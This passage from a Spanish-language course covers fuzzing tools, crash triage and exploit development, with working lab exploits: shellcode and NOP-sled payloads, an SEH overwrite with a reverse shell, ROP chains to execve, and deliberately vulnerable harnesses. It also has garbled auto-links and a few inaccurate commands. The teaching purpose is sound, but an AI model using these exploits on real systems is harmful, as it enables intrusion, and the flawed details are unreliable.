int parse_command(const char *cmd, size_t len) {
    if (len < 4) return -1;
    
    char buf[16];
    
    // Vulnerabilidad: si el comando es muy largo
    if (cmd[0] == 'G' && cmd[1] == 'E' && cmd[2] == 'T') {
        // Copia el path
        for (int i = 4; i < len && cmd[i] != ' '; i++) {
            buf[i-4] = cmd[i];  // Overflow potencial
        }
        return 1;
    }
    
    return 0;
}

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Crear string null-terminated
    char *cmd = malloc(size + 1);
    memcpy(cmd, data, size);
    cmd[size] = '\0';
    
    parse_command(cmd, size);
    
    free(cmd);
    return 0;
}
```

```bash
clang -g -fsanitize=fuzzer,address -o fuzz_me fuzz_me.c
mkdir -p corpus
echo "GET /test HTTP/1.1" > corpus/seed.txt
./fuzz_me corpus/
```

**Ejercicio 2: Fuzzear con coverage report**

```bash
# Compilar con coverage
clang -g -fsanitize=fuzzer -fprofile-instr-generate -fcoverage-mapping -o fuzz_me fuzz_me.c

# Ejecutar y generar perfil
LLVM_PROFILE_FILE="fuzz_me.profraw" ./fuzz_me corpus/ -runs=100000

# Convertir a formato legible
llvm-profdata merge -sparse fuzz_me.profraw -o fuzz_me.profdata
llvm-cov show fuzz_me -instr-profile=fuzz_me.profdata > coverage.txt

# Ver cobertura
head -100 coverage.txt
```

**Ejercicio 3: Merge de corpus**

```bash
# Tienes dos corpus de diferentes fuzzing campaigns
./fuzzer -merge=1 merged_corpus/ corpus1/ corpus2/

# El resultado contiene solo inputs que agregan cobertura nueva
# Esto minimiza el corpus manteniendo la cobertura total
```

<a name="honggfuzz"></a>
## 5. Honggfuzz

<a name="intro-honggfuzz"></a>
### 5.1 Introduccion a Honggfuzz

Honggfuzz es un fuzzer de seguridad desarrollado por Google. Es conocido por ser facil de usar, rapido, y tener soporte para hardware-based coverage.

**Caracteristicas principales:**
- Fuzzing persistent mode (in-process)
- Hardware-based coverage (Intel BTS, Intel PT)
- Software-based coverage (sanitizer-based)
- Fuzzing de binarios sin recompilar
- Soporte para corpus minimization
- Fuzzing de red (con servidores TCP/UDP)

**Instalacion:**
```bash
git clone [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/google/honggfuzz
cd honggfuzz
make -j$(nproc)
[sudo](../raw/l1n9x-pr1v3sc.md#sudo) make install
```

<a name="hardware-coverage"></a>
### 5.2 Hardware-based coverage feedback

Honggfuzz puede usar hardware features de Intel para medir cobertura SIN instrumentacion.

**Intel BTS (Branch Trace Store):**
```bash
# Requiere: kernel con perf_event, CPU Intel con BTS
# Activar:
echo 0 > /proc/sys/[kernel](../raw/0s-f0nd4m3nt0s.md#kernel)/kptr_restrict
echo -1 > /proc/sys/kernel/perf_event_paranoid

# Fuzzing con BTS
honggfuzz --linux_bts=1 -i input -o output -- ./target
```

**Intel PT (Processor Trace):**
```bash
# Requiere: CPU Intel con PT (Haswell+)
# Fuzzing con PT (mas rapido que BTS)
honggfuzz --linux_pt=1 -i input -o output -- ./target
```

**Ventajas del hardware coverage:**
- Sin necesidad de recompilar
- Sin overhead de instrumentacion en software
- Coverage preciso a nivel de instruccion
- Funciona con binarios de los que no tienes fuente

<a name="persistent-honggfuzz"></a>
### 5.3 Persistent fuzzing

Honggfuzz soporta persistent mode similar a AFL.

**Harness para persistent mode:**
```c
// persistent_target.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Funcion vulnerable
void process_data(char *data, size_t len) {
    char buf[32];
    if (len > 32) {
        memcpy(buf, data, len);  // Overflow!
    }
}

int main(int argc, char **argv) {
    unsigned char buf[1024];
    ssize_t len;
    
    while ((len = read(0, buf, sizeof(buf))) > 0) {
        process_data((char *)buf, len);
    }
    
    return 0;
}
```

**Compilar y fuzzear:**
```bash
# Compilar normalmente (sin instrumentacion)
gcc -o persistent_target persistent_target.c

# Fuzzear con Honggfuzz en modo persistente
honggfuzz --stdin_input -i input -o output -- ./persistent_target
```

**Modo no-persistente (fork):**
```bash
# Cada ejecucion es un fork, como AFL clasico
honggfuzz --no_fuzz -i input -o output -- ./target __FILE__
```

<a name="comparacion-afl-honggfuzz"></a>
### 5.4 Comparacion: AFL++ vs Honggfuzz

| Caracteristica | AFL++ | Honggfuzz |
|---------------|-------|-----------|
| Coverage | Software (compile-time) | Software + Hardware (BTS/PT) |
| Velocidad | 500-2000 exec/s | 1000-10000 exec/s |
| Binarios sin source | QEMU mode (+ lento) | PT mode (+ rapido) |
| Persistent mode | Si (__AFL_LOOP) | Si (read stdin) |
| Red fuzzing | No nativo | Si (TCP/UDP) |
| Corpus minimization | afl-cmin | hfuzz-cmin |
| Sanitizers | ASAN, UBSAN, MSAN | ASAN, UBSAN |
| Facilidad de uso | Media | Alta |

**Cuando usar cada uno:**
- **AFL++:** Proyectos grandes con codigo fuente, fuzzing de librerias
- **Honggfuzz:** Binarios sin fuente, fuzzing rapido, hardware coverage
- **Ambos:** Usa ambos para maximizar cobertura

<a name="ejercicios-honggfuzz"></a>
### 5.5 Ejercicios practicos Honggfuzz

**Ejercicio 1: Fuzzear un binario**

```bash
# Sin source, sin recompilar
honggfuzz --linux_pt=1 -i input_dir -o output_dir -- ./target @@
```

**Ejercicio 2: Fuzzing de red**

```c
// server.c - Servidor vulnerable
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void handle_client(int client_fd) {
    char buf[64];
    int n = read(client_fd, buf, sizeof(buf));
    if (n > 64) {
        // No deberia pasar porque sizeof(buf)=64, pero...
        char response[64];
        memcpy(response, buf, n);  // Overflow!
        write(client_fd, response, n);
    }
    close(client_fd);
}

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {.sin_family=AF_INET, .sin_port=htons(9999), .sin_addr=INADDR_ANY};
    bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(server_fd, 10);
    
    while (1) {
        int client = accept(server_fd, NULL, NULL);
        handle_client(client);
    }
}
```

```bash
# Fuzzear el servidor
honggfuzz --netfn=127.0.0.1:9999 -i input -o output -- ./server
```

<a name="fuzzing-lenguajes"></a>
## 6. Fuzzing en Lenguajes Interpretados

<a name="atheris"></a>
### 6.1 Fuzzing Python con Atheris

Atheris es un fuzzer de Google para Python basado en LibFuzzer.

**Instalacion:**
```bash
pip install atheris
```

**Fuzz target basico:**
```python
import atheris
import sys

def TestOneInput(data):
    # data es bytes
    try:
        # Llamar la funcion que queres fuzzear
        result = process_data(data)
    except Exception:
        # Las excepciones no cuentan como crash
        pass

def process_data(data):
    # Funcion vulnerable que queres testear
    if len(data) > 10:
        raise ValueError("Too long")
    
    # Procesar datos...
    decoded = data.decode("utf-8")
    if decoded == "admin":
        # Bug: si el input es exactamente "admin", crashea
        raise RuntimeError("Crash!")
    
    return decoded

atheris.Setup(sys.argv, TestOneInput)
atheris.Fuzz()
```

**Ejecutar:**
```bash
python3 fuzz_target.py -max_len=128 -timeout=5
```

**Fuzzing de librerias:**
```python
import atheris
import sys
import json

def TestOneInput(data):
    try:
        # Fuzzear el parser JSON de Python
        obj = json.loads(data)
    except (json.JSONDecodeError, UnicodeDecodeError):
        pass

atheris.Setup(sys.argv, TestOneInput)
atheris.Fuzz()
```

**Con diccionario:**
```bash
atheris fuzz_target.py -dict=json.dict corpus/
```

<a name="jazzer"></a>
### 6.2 Fuzzing Java con Jazzer

Jazzer es un fuzzer para Java basado en LibFuzzer.

**Instalacion:**
```bash
# Descargar Jazzer
wget https://github.com/CodeIntelligenceTesting/jazzer/releases/latest/download/jazzer-linux.tar.gz
tar -xzvf jazzer-linux.tar.gz
```

**Fuzz target:**
```java
// FuzzTest.java
import com.code_intelligence.jazzer.api.CannedFuzzedDataProvider;
import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import com.code_intelligence.jazzer.junit.FuzzTest;

public class FuzzTest {
    @FuzzTest
    void myFuzzTest(FuzzedDataProvider data) {
        String input = data.consumeRemainingAsString();
        
        // Tu codigo aqui
        try {
            MyParser.parse(input);
        } catch (Exception e) {
            // No atrapar RuntimeException
        }
    }
}
```

**Ejecutar:**
```bash
./jazzer --target_class=FuzzTest --autofuzz=com.example.MyParser::parse
```

**Fuzzing de funciones especificas:**
```java
import com.code_intelligence.jazzer.api.FuzzedDataProvider;

public class JsonFuzzer {
    public static void fuzzerTestOneInput(FuzzedDataProvider data) {
        String json = data.consumeRemainingAsString();
        try {
            // Fuzzear Gson o Jackson
            Gson gson = new Gson();
            gson.fromJson(json, Object.class);
        } catch (JsonSyntaxException e) {
            // Esperado
        }
    }
}
```

**Ejecutar con Jazzer:**
```bash
./jazzer --target_class=JsonFuzzer -cp=target/classes:$(find ~/.m2 -name "*.jar" | tr '\n' ':')
```

<a name="go-fuzz"></a>
### 6.3 Fuzzing Go con go-fuzz

**Instalacion:**
```bash
go install github.com/dvyukov/go-fuzz/go-fuzz@latest
go install github.com/dvyukov/go-fuzz/go-fuzz-build@latest
```

**Fuzz target:**
```go
package fuzz

import (
    "fmt"
    "github.com/dvyukov/go-fuzz/examples/fuzz"
)

func Fuzz(data []byte) int {
    // Tu codigo de fuzzing
    result, err := MyParser(string(data))
    if err != nil {
        return 0
    }
    fmt.Println(result)  // Si esto crashea, Go-fuzz lo detecta
    return 1
}
```

**Construir y ejecutar:**
```bash
go-fuzz-build github.com/user/program/fuzz
go-fuzz -bin=./program-fuzz.zip -workdir=output
```

<a name="cargo-fuzz"></a>
### 6.4 Fuzzing Rust con cargo-fuzz

**Setup:**
```bash
cargo install cargo-fuzz
cargo fuzz init
```

**Fuzz target:**
```rust
// fuzz_targets/fuzz_target_1.rs
#![no_main]
use libfuzzer_sys::fuzz_target;

fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = my_parser::parse(s);
    }
});
```

**Ejecutar:**
```bash
cargo fuzz run fuzz_target_1
```

<a name="ejercicios-fuzzing-lenguajes"></a>
### 6.5 Ejercicios practicos

**Ejercicio 1: Fuzzear un parser XML en Python**

```python
import atheris
import sys
import xml.etree.ElementTree as ET

def TestOneInput(data):
    try:
        ET.fromstring(data)
    except (ET.ParseError, UnicodeDecodeError):
        pass

atheris.Setup(sys.argv, TestOneInput)
atheris.Fuzz()
```

```bash
atheris xml_fuzzer.py -max_len=4096 -timeout=10 corpus/
```

**Ejercicio 2: Fuzzear un validador de URLs en Go**

```go
package fuzz

import "net/url"

func Fuzz(data []byte) int {
    u, err := url.Parse(string(data))
    if err != nil {
        return 0
    }
    // Si el URL es valido, intenta mas operaciones
    _ = u.Hostname()
    _ = u.Port()
    _ = u.Query()
    return 1
}
```



<a name="crash-triage"></a>
## 7. Crash Triage y Analisis

<a name="dedup-crashes"></a>
### 7.1 Deduplicacion de crashes

No todos los crashes son unicos. Muchos crashes diferentes pueden ser el mismo bug.

**Por que deduplicar:**
- 1000 crashes file pueden ser 1 solo bug
- Cada crash unico necesita analisis manual

**Metodos de deduplicacion:**
1. Backtrace matching - Compara stack traces
2. Coverage-based - Misma cobertura = mismo bug
3. Crash hash - Hash del backtrace
**Deduplicacion con GDB:**
```bash
#!/bin/bash
CRASH_DIR="output_dir/crashes"
> unique_hashes.txt
for crash in "$CRASH_DIR"/*; do
    bt=$(gdb -batch -ex "run < $crash" -ex "bt" ./target 2>&1)
    [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)=$(echo "$bt" | grep "^#" | awk "{print \$2}" | md5sum | cut -d" " -f1)
    if ! grep -q "$hash" unique_hashes.txt; then
        echo "$hash" >> unique_hashes.txt
        echo "[+] New unique crash: $crash"
        cp "$crash" "unique_crashes/$hash.bin"
    else
        echo "[-] Duplicate: $crash"
    fi
done
```
<a name="exploitable-crashwalk"></a>
### 7.2 Exploitable y crashwalk

**GDB Exploitable:**
```bash
git clone https://github.com/jfoote/exploitable
cd exploitable && sudo python3 setup.py install
gdb -batch -ex "run < crash.bin" -ex "exploitable" ./target
```

**Resultados:**
- EXPLOITABLE: El crash es explotable (EIP/RIP control)
- PROBABLY_EXPLOITABLE: Alta probabilidad
- PROBABLY_NOT_EXPLOITABLE: Baja probabilidad
- UNKNOWN: No se puede determinar

**Crashwalk:**
```bash
go install github.com/bnagy/crashwalk/cmd/cwtool@latest
cwtool -gdb /usr/bin/gdb -bt -p output_dir/crashes/ -- ./target @@
```

<a name="clasificacion-crashes"></a>
### 7.3 Clasificacion de crashes

| Tipo | Sintoma | Explotable? |
|------|---------|-------------|
| SIGSEGV | Segmentation fault | Generalmente si |
| SIGABRT | Abort (ASAN) | Depende |
| SIGFPE | Floating point exception | Raramente |
| SIGILL | Illegal instruction | Raramente |

**Clasificacion por tipo de memory corruption:**
1. Stack overflow -> EIP control
2. Heap overflow -> Write primitive
3. Use-after-free -> Type confusion
4. Double free -> Heap corruption
5. Format string -> Leer/escribir

**Clasificador automatico en Python:**
```python
import subprocess, re, json

def classify_crash(target, crash_file):
    result = subprocess.run(
        ["gdb", "-batch", "-ex", f"run < {crash_file}",
         "-ex", "bt", "-ex", "info registers", "-ex", "quit", target],
        capture_output=True, text=True
    )
    output = result.stdout
    
    classification = {
        "crash_type": "unknown",
        "exploitable": False,
        "eip_control": False
    }
    
    if "0x41414141" in output or "0x42424242" in output:
        classification["eip_control"] = True
        classification["crash_type"] = "stack_overflow"
        classification["exploitable"] = True
    
    if "SIGSEGV" in output:
        classification["crash_type"] = "segfault"
    
    return classification

print(json.dumps(classify_crash("./target", "crash.bin"), indent=2))
```
<a name="minimizacion-inputs"></a>
### 7.4 Minimizacion de inputs

**AFL Tmin:**
```bash
afl-tmin -i crash.bin -o minimized.bin -- ./target @@
```

**Minimizador manual:**
```python
import subprocess

def test_crash(data):
    with open("/tmp/test.bin", "wb") as f: f.write(data)
    r = subprocess.run(["./target", "/tmp/test.bin"], capture_output=True, timeout=5)
    return r.returncode != 0

def minimize(data):
    if not test_crash(data): return None
    m = bytearray(data)
    for i in range(len(data)-1, -1, -1):
        t = m[:i] + m[i+1:]
        if test_crash(bytes(t)): m = bytearray(t)
    return bytes(m)

with open("crash.bin", "rb") as f: original = f.read()
minimized = minimize(original)
print(f"Original: {len(original)}b -> Min: {len(minimized)}b")
```
<a name="triage-automatizado"></a>
### 7.5 Triage automatizado

**Pipeline completo:**
```bash
#!/bin/bash
TARGET="./target"
CRASH_DIR="output_dir/crashes"
mkdir -p unique_crashes minimized_crashes

echo "[*] Deduplicating..."
> unique_crashes/hashes.txt
for crash in "$CRASH_DIR"/*; do
    bt=$(gdb -batch -ex "run < $crash" -ex "bt" $TARGET 2>&1)
    hash=$(echo "$bt" | grep "^#" | head -5 | md5sum | cut -d" " -f1)
    if ! grep -q "$hash" unique_crashes/hashes.txt; then
        echo "$hash" >> unique_crashes/hashes.txt
        cp "$crash" "unique_crashes/$hash.crash"
    fi
done

echo "[*] Minimizing..."
for crash in unique_crashes/*.crash; do
    name=$(basename "$crash" .crash)
    afl-tmin -i "$crash" -o "minimized_crashes/$name.min" -- $TARGET @@ 2>/dev/null
done

echo "[*] Classifying..."
for m in minimized_crashes/*; do
    echo "=== $(basename $m) ==="
    gdb -batch -ex "run < $m" -ex "bt 10" -ex "info registers" $TARGET 2>&1 | grep -E "(SIG|^#|rip|rsp)"
done
```
<a name="ejercicios-triage"></a>
### 7.6 Ejercicios practicos

**Ejercicio:** Pipeline completo de triage
1. Genera crashes con AFL
2. Deduplica
3. Minimiza cada crash
4. Clasifica (exploitable o no)
5. Genera reporte

```bash
mkdir -p triage_lab/{raw,unique,minimized,reports}
for crash in raw/*; do
    hash=$(md5sum "$crash" | cut -d" " -f1)
    gdb -batch -ex "run < $crash" -ex "bt 20" ./target > "reports/$hash.bt" 2>&1
    if grep -q "0x[0-9a-f]*41414141" "reports/$hash.bt"; then
        echo "[EXPLOITABLE] $hash"
        cp "$crash" "unique/$hash.exploitable"
    fi
done
```

<a name="memory-corruption"></a>
## 8. Memory Corruption Exploitation Theory

<a name="buffer-overflow"></a>
### 8.1 Buffer overflow

El buffer overflow es la vulnerabilidad mas clasica. Ocurre cuando se escriben mas datos de los que el buffer puede contener.

**Stack overflow:**
```c
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Si input > 64, overflow!
}
```

**Layout del stack:**
```
Direcciones bajas
+------------------+
| buffer[0..63]    | <- espacio para 64 bytes
+------------------+
| EBP (saved)      | <- 4 bytes
+------------------+
| EIP (saved)      | <- Return address <- OBJETIVO!
+------------------+
```

**Explotacion clasica:**
1. Llenar buffer hasta EIP
2. Sobrescribir EIP con direccion del shellcode
3. Colocar shellcode

```python
from pwn import *
offset = 76
junk = b"A" * offset
eip = p32(0xdeadbeef)  # direccion del buffer
shellcode = [asm](../raw/4ss3mbly-f0r-h4ck3rs.md)(shellcraft.sh())
[payload](../raw/m3t4spl01t.md#payloads) = junk + eip + shellcode
```

<a name="integer-overflow"></a>
### 8.2 Integer overflow

Ocurre cuando una operacion aritmetica produce un valor que no cabe en el tipo.

```c
void copy_data(char *input, size_t input_len) {
    char *buffer = malloc(input_len + 1);  // Si input_len=0xFFFFFFFF, wrap-around a 0
    if (buffer) memcpy(buffer, input, input_len);
}
```

| Tipo | Rango | Wrap-around |
|------|-------|-------------|
| unsigned char | 0-255 | 255+1=0 |
| unsigned short | 0-65535 | 65535+1=0 |
| unsigned int | 0-4B | 0xFFFFFFFF+1=0 |
| signed int | -2B a 2B | 0x7FFFFFFF+1=-2B |

<a name="use-after-free"></a>
### 8.3 Use-after-free (UAF)

Ocurre cuando se accede a memoria despues de liberarla.

```c
struct object {
    void (*callback)(void);
    char data[64];
};

void uaf_example() {
    struct object *obj = malloc(sizeof(struct object));
    obj->callback = harmless_function;
    free(obj);
    // Ahora asignamos memoria controlada en el mismo lugar
    char *attacker = malloc(sizeof(struct object));
    memcpy(attacker, attacker_data, sizeof(struct object));
    obj->callback();  // UAF! Llamamos a la funcion del atacante
}
```

<a name="format-string"></a>
### 8.4 Format string

Ocurre cuando un usuario controla el formato de printf.

```c
void log_message(char *user_input) {
    printf(user_input);  // VULNERABLE!
}
```

**Format specifiers peligrosos:**
- %x - Leer del stack (hex)
- %s - Leer string de una direccion
- %n - ESCRIBIR a una direccion (peligroso!)
- %hn - Escribir 2 bytes

<a name="heap-overflow"></a>
### 8.5 Heap overflow

Overflow en memoria dinamica. Mas complejo que stack overflow por las estructuras del heap.

```c
void heap_vuln(char *input, size_t len) {
    char *b1 = malloc(64);
    char *b2 = malloc(64);
    memcpy(b1, input, len);  // overflow corrompe metadata de b2
    free(b2);  // crash si metadata corrupta
    free(b1);
}
```

**Tecnicas de explotacion:**
- House of Force: Corromper top chunk
- Fastbin attack: Corromper fastbin linked list
- Unsafe unlink: Corromper metadata de chunk liberado
- Tcache poisoning: Corromper tcache (glibc 2.26+)

<a name="type-confusion"></a>
### 8.6 Type confusion

Ocurre cuando un objeto es tratado como un tipo diferente.

```c++
class Base { virtual void func() {} };
class Derived : public Base { virtual void func() {} void secret() {} };

void type_confusion(Base *obj) {
    Derived *d = static_cast<Derived*>(obj);  // Si obj no es Derived, UB!
    d->secret();
}
```

**Ejemplo real (CVE-2015-5119 - Flash):**
1. Crear objeto tipo A
2. Confundirlo con tipo B (diferente vtable offset)
3. Ejecutar la funcion virtual que apunta a shellcode



<a name="writing-pocs"></a>
## 9. Writing PoCs: De Crash a Exploit

<a name="eip-rip-control"></a>
### 9.1 EIP/RIP control

El primer paso para explotar un buffer overflow es obtener control del Instruction Pointer (EIP en x86, RIP en x64).

**Determinar el offset:**

**Metodo 1: Pattern (msf-pattern):**
```bash
# Generar patron
msf-pattern_create -l 100
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3

# Ejecutar con patron y ver EIP
./target Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5...
# EIP = 0x37624136 (6Ab7 en little endian)

# Encontrar offset
msf-pattern_offset -l 100 -q 0x37624136
# Exact match at offset 76
```

**Metodo 2: pwntools cyclic:**
```python
from pwn import *

# Generar patron
pattern = cyclic(100)

# Ejecutar (simulado)
print(f"Enviando: {pattern[:50]}...")

# Si EIP = 0x63616170
offset = cyclic_find(0x63616170)
print(f"Offset: {offset}")
```

**Metodo 3: Manual con GDB:**
```bash
gdb ./target
(gdb) run $(python3 -c "print('A'*100)")
Program received signal SIGSEGV
(gdb) info registers eip
eip = 0x41414141  # AAAA = 4 [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)

# Probar con 50, luego con 60, etc hasta encontrar el offset exacto
```

**Confirmar control de EIP:**
```python
from pwn import *
offset = 76
payload = b"A" * offset + b"BBBB" + b"C" * 50
# Si EIP = 0x42424242, tenes control!
```

<a name="seh-overwrite"></a>
### 9.2 SEH overwrite (Windows)

En Windows, Structured Exception Handling (SEH) es un mecanismo para manejar excepciones. Sobrescribir el SEH permite tomar control cuando ocurre una excepcion.

**Estructura SEH en el stack:**
```
+------------------+
| ...              |
+------------------+
| SEH Handler      | <- [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) al manejador de excepcion
+------------------+
| Next SEH         | <- Puntero al siguiente registro SEH
+------------------+
| ...              |
+------------------+
```

**Explotacion SEH:**
```python
from pwn import *

# 1. Encontrar offset hasta SEH
# 2. Sobrescribir nSEH con instruccion de salto (\xeb\x06)
# 3. Sobrescribir SEH con direccion de POP POP RET
# 4. Colocar shellcode despues de SEH

offset_to_seh = 124
offset_to_handler = 128

nseh = p32(0x9090)  # o jump short: \xeb\x06\x90\x90
handler = p32(0x1001d0f9)  # direccion de POP POP RET
shellcode = asm(shellcraft.revshell())

payload = b"A" * 124 + nseh + handler + shellcode
```

<a name="rop-basics"></a>
### 9.3 ROP chain basics

Return-Oriented Programming (ROP) permite ejecutar codigo arbitrario sin inyectar shellcode, usando gadgets existentes en el binario.

**Que es un gadget?**
Una secuencia de instrucciones que termina en RET. Ejemplos:
```
pop rdi; ret    # Gadget para cargar rdi
pop rsi; ret    # Gadget para cargar rsi
pop rdx; ret    # Gadget para cargar rdx
[syscall](../raw/0s-f0nd4m3nt0s.md#syscalls); ret    # Gadget para [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls)
```

**ROP para ejecutar execve("/bin/sh", 0, 0):**
```python
from pwn import *

elf = ELF("./target")

# Encontrar gadgets
pop_rdi = next(elf.search(asm("pop rdi; ret", arch="amd64")))
pop_rsi = next(elf.search(asm("pop rsi; ret", arch="amd64")))
pop_rdx = next(elf.search(asm("pop rdx; ret", arch="amd64")))
syscall = next(elf.search(asm("syscall; ret", arch="amd64")))

# Direccion de "/bin/sh" en libc o en el binario
binsh = next(elf.search(b"/bin/sh\x00"))

# ROP chain: execve("/bin/sh", NULL, NULL)
rop_chain = [
    p64(pop_rdi), p64(binsh),
    p64(pop_rsi), p64(0),
    p64(pop_rdx), p64(0),
    p64(syscall)
]

offset = 72
payload = b"A" * offset + b"".join(rop_chain)

print(f"ROP chain: {rop_chain}")
print(f"Payload length: {len(payload)}")
```

**ROP gadgets comunes:**
```
# x64
pop rdi; ret
pop rsi; ret
pop rdx; ret
pop rax; ret  # Para cargar syscall number
syscall; ret
ret  # Para alinear stack

# x86
pop eax; ret
pop ebx; ret
pop ecx; ret
pop edx; ret
int 0x80; ret
```

**Buscar gadgets con ROPgadget:**
```bash
# Instalar
pip install ROPgadget

# Buscar gadgets
ROPgadget --binary ./target

# Buscar gadget especifico
ROPgadget --binary ./target | grep "pop rdi"
ROPgadget --binary ./target | grep "syscall"

# Exportar todos los gadgets
ROPgadget --binary ./target > gadgets.txt
```

<a name="crash-a-poc"></a>
### 9.4 De crash a PoC funcional

**Pipeline de exploit development:**

```
Crash encontrado por fuzzing
        |
        v
1. Reproducir el crash
        |
        v
2. Minimizar el input
        |
        v
3. Determinar tipo de [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades)
        |
        v
4. Encontrar offset (EIP/RIP control?)
        |
        v
5. Verificar protecciones (ASLR, NX, DEP, Stack Canary)
        |
        v
6. Bypass de protecciones
   - NX habilitado? -> ROP
   - ASLR? -> Leak + ROP
   - Canary? -> Leak + bruteforce
   - RELRO? -> Partial overwrite
        |
        v
7. Construir [exploit](../raw/m3t4spl01t.md#exploits)
        |
        v
8. Probar exploit localmente
        |
        v
9. Adaptar a remoto
```

**Verificar protecciones:**
```bash
# Con checksec (pwntools)
python3 -c "from pwn import *; e = ELF('./target'); print(e.checksec())"

# Con checksec --file
checksec --file=./target

# Salida:
# RELRO: Full RELRO
# Stack canary: No
# NX: Enabled
# PIE: Disabled
```

**Caso practico: exploit para un crash de AFL**

**Paso 1: Analizar el crash**
```bash
gdb -batch -ex "run < crash.bin" -ex "bt" -ex "info registers" ./target
# Program received signal SIGSEGV
# EIP: 0x41414141
# EBP: 0x41414141
```

**Paso 2: Encontrar offset**
```bash
msf-pattern_create -l 200 > pattern.bin
./target < pattern.bin
# EIP = 0x33624132
msf-pattern_offset -l 200 -q 0x33624132
# Offset = 76
```

**Paso 3: Verificar protecciones**
```bash
checksec --file=./target
# NX disabled, no canary, no ASLR
# -> Podemos inyectar shellcode directamente
```

**Paso 4: Exploit final**
```python
#!/usr/bin/env python3
from pwn import *

# Config
context.arch = "i386"
target_binary = "./target"

# Offset
offset = 76

# Protecciones: NX disabled, no canary
# -> Podemos meter shellcode en el buffer

# Shellcode
shellcode = asm(shellcraft.sh())

# Buffer address (necesitas obtenerla con GDB)
buffer_addr = 0xffffd2a0  # Ejemplo, ajustar

# Payload
payload = b"A" * offset
payload += p32(buffer_addr)  # EIP -> buffer
payload += b"\x90" * 16     # NOP sled
payload += shellcode

print(f"[*] Payload length: {len(payload)}")
print(f"[*] Writing to exploit.bin")

with open("exploit.bin", "wb") as f:
    f.write(payload)

print("[*] Run: ./target < exploit.bin")
```

<a name="automatizacion-pocs"></a>
### 9.5 Automatizacion de PoCs

**Script para generar PoCs de todos los crashes:**
```python
#!/usr/bin/env python3
"""Genera PoCs para todos los crashes de una campaign"""
import subprocess, json, os, sys
from concurrent.futures import ThreadPoolExecutor

def analyze_crash(target_path, crash_file):
    try:
        result = subprocess.run(
            ["gdb", "-batch", target_path,
             "-ex", f"run < {crash_file}",
             "-ex", "info registers eip rip",
             "-ex", "bt 5",
             "-ex", "quit"],
            capture_output=True, text=True, timeout=10
        )
        output = result.stdout + result.stderr
        
        analysis = {
            "crash": crash_file,
            "eip_controlled": False,
            "offset": None,
            "crash_signal": None
        }
        
        # Check for signal
        for line in output.split("\n"):
            if "signal" in line.lower():
                analysis["crash_signal"] = line.strip()
            if "eip" in line.lower() and "0x" in line:
                eip_val = line.split()[-1]
                if "4141" in eip_val or "4242" in eip_val:
                    analysis["eip_controlled"] = True
        
        return analysis
    except Exception as e:
        return {"crash": crash_file, "error": str(e)}

def generate_poc(target, crash, analysis):
    if not analysis.get("eip_controlled"):
        return None
    
    poc = f"""#!/usr/bin/env python3
# PoC for crash: {crash}
# Target: {target}
# Analysis: EIP controlled

import sys

# Offset encontrado: {analysis.get("offset", "needs determination")}
offset = 76
junk = b"A" * offset
eip = b"BBBB"  # Replace with actual address

payload = junk + eip

if len(sys.argv) > 1:
    with open(sys.argv[1], "wb") as f:
        f.write(payload)
    print(f"[+] PoC written to {sys.argv[1]}")
else:
    sys.stdout.buffer.write(payload)
"""
    return poc

# Main
if __name__ == "__main__":
    target = sys.argv[1]
    crash_dir = sys.argv[2]
    output_dir = sys.argv[3]
    
    os.makedirs(output_dir, exist_ok=True)
    crashes = [os.path.join(crash_dir, f) for f in os.listdir(crash_dir)]
    
    # Analizar crashes en paralelo
    with ThreadPoolExecutor(max_workers=8) as ex:
        results = list(ex.map(lambda c: analyze_crash(target, c), crashes))
    
    # Generar PoCs
    for r in results:
        poc = generate_poc(target, r["crash"], r)
        if poc:
            name = os.path.basename(r["crash"]) + "_poc.py"
            with open(os.path.join(output_dir, name), "w") as f:
                f.write(poc)
            print(f"[+] PoC generated: {name}")
```

<a name="ejercicios-pocs"></a>
### 9.6 Ejercicios practicos

**Ejercicio 1: De crash de AFL a PoC**

1. Fuzzea un programa vulnerable con AFL
2. Toma un crash de output_dir/crashes/
3. Analiza con GDB
4. Determina si es explotable
5. Genera un PoC

```bash
# Fuzzear
mkdir -p lab/{input,output}
echo "AAAA" > lab/input/seed
afl-gcc -o lab/target vulnerable.c
afl-fuzz -i lab/input -o lab/output -- ./lab/target @@

# Cuando haya crashes:
ls lab/output/crashes/

# Analizar
./lab/target < lab/output/crashes/id* 
# crash!

gdb -batch -ex "run < lab/output/crashes/id*" -ex "bt" -ex "info registers" ./lab/target
```

**Ejercicio 2: Exploit ROP basico**

Dado un binario con NX enabled y ASLR deshabilitado, construi una ROP chain para llamar a execve.

```python
from pwn import *

elf = ELF("./target")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Gadgets
pop_rdi = 0x400696  # de ROPgadget
pop_rsi = 0x400694
pop_rdx = 0x400692
ret = 0x4004a6  # para alinear stack

# Addresses
binsh = 0x601060  # "/bin/sh" en .data o libc

# ROP chain: execve("/bin/sh", NULL, NULL)
payload = b"A" * 72
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(elf.plt["execve"])  # o system()

io = process("./target")
io.sendline(payload)
io.interactive()
```



<a name="lab-fuzzing"></a>
## 10. Laboratorio Integrador

<a name="setup-lab-fuzzing"></a>
### 10.1 Setup del laboratorio

